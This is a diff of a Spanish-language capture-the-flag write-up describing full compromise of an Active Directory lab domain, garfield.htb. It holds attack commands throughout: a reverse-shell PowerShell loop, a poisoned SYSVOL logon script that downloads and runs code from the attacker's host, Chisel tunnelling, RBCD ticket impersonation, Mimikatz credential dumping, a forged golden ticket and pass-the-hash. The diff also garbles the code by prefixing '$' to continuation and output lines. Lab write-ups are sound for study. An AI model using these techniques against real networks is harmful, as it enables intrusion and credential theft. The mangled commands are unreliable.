@@ -41,9 +41,8 @@ summary: "Explotación completa de un dominio Active Directory partiendo de cred
 Empezamos con un escaneo de puertos completo para identificar todos los servicios expuestos:
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -Pn [REDACTED]
+$ nmap -p- --open -sS --min-rate 5000 -vvv -Pn [REDACTED]
 ```
-
 Puertos abiertos — clásica máquina Windows Domain Controller:
 
 | Puerto | Servicio | Versión |
@@ -72,16 +71,15 @@ Confirmamos que es un Domain Controller: `DC01.garfield.htb`, Server 2019 Build 
 Con las credenciales proporcionadas (`j.arbuckle`), listamos los recursos compartidos:
 
 ```bash
-crackmapexec smb [REDACTED] -u j.arbuckle -p '[REDACTED]' --shares
+$ crackmapexec smb [REDACTED] -u j.arbuckle -p '[REDACTED]' --shares
 ```
-
 Acceso de lectura a `SYSVOL` y `NETLOGON`. En `SYSVOL\garfield.htb\scripts\` encontramos un script `.bat`:
 
 ```bash
 smbclient //[REDACTED]/SYSVOL -U j.arbuckle
 smb: \garfield.htb\scripts\> get printerDetect.bat
-```
 
+```
 ```bat
 @echo off
 echo Detecting installed printers...
@@ -90,16 +88,15 @@ wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table
 echo.
 echo Printer detection completed.
 pause
-```
 
+```
 ### LDAP — user enumeration
 
 Enumeramos usuarios del dominio:
 
 ```bash
-netexec ldap [REDACTED] -u j.arbuckle -p '[REDACTED]' --users
+$ netexec ldap [REDACTED] -u j.arbuckle -p '[REDACTED]' --users
 ```
-
 Usuarios relevantes:
 
 | Usuario | Descripción |
@@ -112,9 +109,8 @@ Usuarios relevantes:
 ### bloodAD — permisos de escritura
 
 ```bash
-bloodyAD --host [REDACTED] -u j.arbuckle -p '[REDACTED]' get writable
+$ bloodyAD --host [REDACTED] -u j.arbuckle -p '[REDACTED]' get writable
 ```
-
 Entre los objetos con permiso `WRITE` estaba `CN=Liz Wilson` — la cuenta `l.wilson`. Esto nos permite modificar su atributo `scriptPath`.
 
 ---
@@ -145,53 +141,49 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
   $stream.Write($sendbyte,0,$sendbyte.Length);
   $stream.Flush()
 }
-```
 
+```
 Modificamos `printerDetect.bat` para que descargue y ejecute el payload:
 
 ```bat
 @echo off
 powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[REDACTED]/shell.ps1')"
-```
 
+```
 ### Subida y configuración
 
 Subimos el `.bat` malicioso a SYSVOL:
 
 ```bash
-smbclient //[REDACTED]/SYSVOL \
-  -U "garfield.htb/j.arbuckle%[REDACTED]" \
-  -c 'cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat'
+$ smbclient //[REDACTED]/SYSVOL \
+  $ -U "garfield.htb/j.arbuckle%[REDACTED]" \
+  $ -c 'cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat'
 ```
-
 Configuramos `scriptPath` en el objeto de `l.wilson`:
 
 ```bash
-bloodyAD --host [REDACTED] \
-  -u j.arbuckle \
-  -p '[REDACTED]' \
-  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
-  scriptPath \
-  -v printerDetect.bat
+$ bloodyAD --host [REDACTED] \
+  $ -u j.arbuckle \
+  $ -p '[REDACTED]' \
+  $ set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
+  $ scriptPath \
+  $ -v printerDetect.bat
 ```
-
 ### Recepción de la shell
 
 Montamos servidor HTTP con el `shell.ps1` y un listener en `nc`:
 
 ```bash
-python3 -m http.server 80 &
-nc -nlvp 4444
+$ python3 -m http.server 80 &
+$ nc -nlvp 4444
 ```
-
 Al poco tiempo recibimos la conexión:
 
 ```bash
-connect to [REDACTED] from (UNKNOWN) [REDACTED] 54263
-whoami
-garfield\l.wilson
+$ connect to [REDACTED] from (UNKNOWN) [REDACTED] 54263
+$ whoami
+$ garfield\l.wilson
 ```
-
 **RCE confirmada como `l.wilson`.**
 
 ---
@@ -203,23 +195,21 @@ Desde la shell de `l.wilson` aprovechamos que tenemos permisos para cambiar la c
 ```powershell
 Set-ADAccountPassword -Identity l.wilson_adm -Reset -NewPassword (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force)
 Enable-ADAccount l.wilson_adm
-```
 
+```
 Esto funciona porque el usuario `l.wilson` tiene el permiso `ForceChangePassword` sobre `l.wilson_adm` (lo vimos en `bloodyAD get writable`).
 
 Accedemos por WinRM como `l.wilson_adm`:
 
 ```bash
-evil-winrm -i [REDACTED] -u L.WILSON_ADM -p [REDACTED]
+$ evil-winrm -i [REDACTED] -u L.WILSON_ADM -p [REDACTED]
 ```
-
 ### User flag
 
 ```bash
-*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> type user.txt
-[REDACTED]
+$ *Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> type user.txt
+$ [REDACTED]
 ```
-
 **🚩 Flag de usuario: `[REDACTED]`**
 
 ---
@@ -229,10 +219,9 @@ evil-winrm -i [REDACTED] -u L.WILSON_ADM -p [REDACTED]
 ### Paso 1: Unirse al grupo RODC Administrators
 
 ```bash
-bloodyAD -u l.wilson_adm -p '[REDACTED]' -d garfield.htb --host [REDACTED] \
-  add groupMember "RODC Administrators" l.wilson_adm
+$ bloodyAD -u l.wilson_adm -p '[REDACTED]' -d garfield.htb --host [REDACTED] \
+  $ add groupMember "RODC Administrators" l.wilson_adm
 ```
-
 ### Paso 2: SOCKS proxy al segmento interno
 
 El RODC (`RODC01`) está en una subred interna (`192.168.100.0/24`). Usamos **Chisel** para montar un túnel SOCKS5:
@@ -243,63 +232,59 @@ El RODC (`RODC01`) está en una subred interna (`192.168.100.0/24`). Usamos **Ch
 
 # Víctima (evil-winrm)
 .\chisel.exe client [REDACTED]:8889 R:socks
-```
 
+```
 Configuramos proxychains:
 
 ```
 socks5 127.0.0.1 1080
-```
 
+```
 Confirmamos conectividad al RODC:
 
 ```bash
 proxychains nmap -sT -Pn -p 445,5985 192.168.100.2
 # 445/open, 5985/open
-```
 
+```
 ### Paso 3: RBCD — Resource-Based Constrained Delegation
 
 Creamos una cuenta de máquina falsa:
 
 ```bash
-impacket-addcomputer garfield.htb/j.arbuckle:'[REDACTED]' \
-  -dc-ip [REDACTED] \
-  -computer-name FAKEPC$ \
-  -computer-pass '[REDACTED]'
+$ impacket-addcomputer garfield.htb/j.arbuckle:'[REDACTED]' \
+  $ -dc-ip [REDACTED] \
+  $ -computer-name FAKEPC$ \
+  $ -computer-pass '[REDACTED]'
 ```
-
 Derivamos el AES256 key de la contraseña para usarla en lugar de la contraseña en texto claro:
 
 ```bash
-python3 -c "
-from impacket.krb5.crypto import string_to_key, Enctype
-salt = 'GARFIELD.HTBhostfakepc.garfield.htb'
-key = string_to_key(Enctype.AES256, '[REDACTED]', salt)
-print(key.contents.hex())
-"
+$ python3 -c "
+$ from impacket.krb5.crypto import string_to_key, Enctype
+$ salt = 'GARFIELD.HTBhostfakepc.garfield.htb'
+$ key = string_to_key(Enctype.AES256, '[REDACTED]', salt)
+$ print(key.contents.hex())
+$ "
 ```
-
 Configuramos RBCD para que `FAKEPC$` pueda delegar en `RODC01$`:
 
 ```bash
-impacket-rbcd garfield.htb/l.wilson_adm:'[REDACTED]' \
-  -delegate-to 'RODC01$' \
-  -delegate-from 'FAKEPC$' \
-  -action write \
-  -dc-ip [REDACTED]
+$ impacket-rbcd garfield.htb/l.wilson_adm:'[REDACTED]' \
+  $ -delegate-to 'RODC01$' \
+  $ -delegate-from 'FAKEPC$' \
+  $ -action write \
+  $ -dc-ip [REDACTED]
 ```
-
 Solicitamos un Service Ticket de `Administrator` para `cifs/RODC01.garfield.htb` via S4U2Proxy:
 
 ```bash
-impacket-getST garfield.htb/FAKEPC\$:'[REDACTED]' \
-  -spn cifs/RODC01.garfield.htb \
-  -impersonate Administrator \
-  -dc-ip [REDACTED] \
-  -aesKey [REDACTED]
+$ impacket-getST garfield.htb/FAKEPC\$:'[REDACTED]' \
+  $ -spn cifs/RODC01.garfield.htb \
+  $ -impersonate Administrator \
+  $ -dc-ip [REDACTED] \
+  $ -aesKey [REDACTED]
 ```
-
 Esto nos da un ticket de `Administrator` para acceder al RODC.
 
 ### Paso 4: Acceso al RODC como SYSTEM
@@ -307,10 +292,9 @@ Esto nos da un ticket de `Administrator` para acceder al RODC.
 Ejecutamos psexec a través del proxy SOCKS:
 
 ```bash
-export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
-proxychains impacket-psexec -k -no-pass Administrator@RODC01.garfield.htb
+$ export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+$ proxychains impacket-psexec -k -no-pass Administrator@RODC01.garfield.htb
 ```
-
 Y obtenemos una shell como SYSTEM en `RODC01`.
 
 ### Paso 5: Dump del hash krbtgt_8245 con Mimikatz
@@ -319,14 +303,14 @@ Descargamos Mimikatz:
 
 ```powershell
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[REDACTED]:80/mimikatz.exe', 'C:\Windows\Temp\mimikatz.exe')"
-```
 
+```
 Dumpeamos las credenciales de la cuenta `krbtgt_8245` — la cuenta krbtgt específica del RODC:
 
 ```
 mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
-```
 
+```
 Datos críticos obtenidos:
 
 | Key | Valor |
@@ -351,8 +335,8 @@ Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
 
 Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
   -Clear "msDS-NeverRevealGroup"
-```
 
+```
 ### Paso 7: Golden Ticket + TGS para krbtgt
 
 Forjamos un golden ticket para `Administrator` usando el AES256 de `krbtgt_8245`:
@@ -364,8 +348,8 @@ Forjamos un golden ticket para `Administrator` usando el AES256 de `krbtgt_8245`
   /domain:garfield.htb `
   /sid:S-1-5-21-2502726253-3859040611-225969357 `
   /nowrap
-```
 
+```
 Esto nos da un ticket TGT de `Administrator` forjado con la clave del RODC krbtgt.
 
 Luego solicitamos un TGS para `krbtgt/garfield.htb` usando ese golden ticket (esto nos da el hash NTLM del propio `Administrator`):
@@ -377,8 +361,8 @@ Luego solicitamos un TGS para `krbtgt/garfield.htb` usando ese golden ticket (es
   /dc:"DC01.garfield.htb" `
   /ticket:"[REDACTED]" `
   /nowrap
-```
 
+```
 El resultado incluye el hash NTLM de `Administrator`:
 
 | Campo | Valor |
@@ -388,21 +372,20 @@ El resultado incluye el hash NTLM de `Administrator`:
 ### Paso 8: Acceso como Domain Admin al DC01
 
 ```bash
-evil-winrm -i [REDACTED] -u Administrator -H [REDACTED]
+$ evil-winrm -i [REDACTED] -u Administrator -H [REDACTED]
 ```
-
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 garfield\administrator
-```
 
+```
 ### Root flag
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 [REDACTED]
-```
 
+```
 **🚩 Flag de root: `[REDACTED]`**
 
 ---
@@ -440,8 +423,8 @@ Configurar msDS-RevealOnDemandGroup + asktgs
         ▼
 Pass-the-hash por WinRM a DC01
 → Domain Admin ✅ → root.txt ✅
-```
 
+```
 ---
 
 ## Vectores explotados
